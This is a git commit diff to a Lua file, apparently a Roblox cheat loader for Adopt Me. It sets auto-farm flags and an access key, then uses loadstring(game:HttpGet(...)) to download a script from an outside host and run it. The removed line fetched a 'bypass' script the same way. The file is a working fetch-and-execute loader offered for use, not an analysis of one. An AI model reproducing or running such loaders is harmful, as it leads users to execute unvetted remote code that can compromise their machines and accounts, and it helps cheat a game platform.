a55cf3de53a840169be0a23cfe9abb87425c7091
Draculakemse <welcomechen22@gmail.com>
2024-12-07 00:15:00 +0000

    Update monekys.lua

--- monekys.lua
+++ monekys.lua
@@ -1,1 +1,8 @@
-loadstring(game:HttpGet("https://nb0.xyz/scripts/adoptme_bypass_o.lua"))()
+getgenv().hub_key = "a9d94c557869d4b279b0e8af4a7d1ea8"
+getgenv().custom_label = "SECRET"
+getgenv().BabyFarmActive = true
+getgenv().PetFarmActive = true
+getgenv().PotFarm = true
+getgenv().PetFarm = false
+getgenv().EggFarm = false
+loadstring(game:HttpGet("https://nb0.xyz/scripts/2GMANAGER_FARM.lua"))()
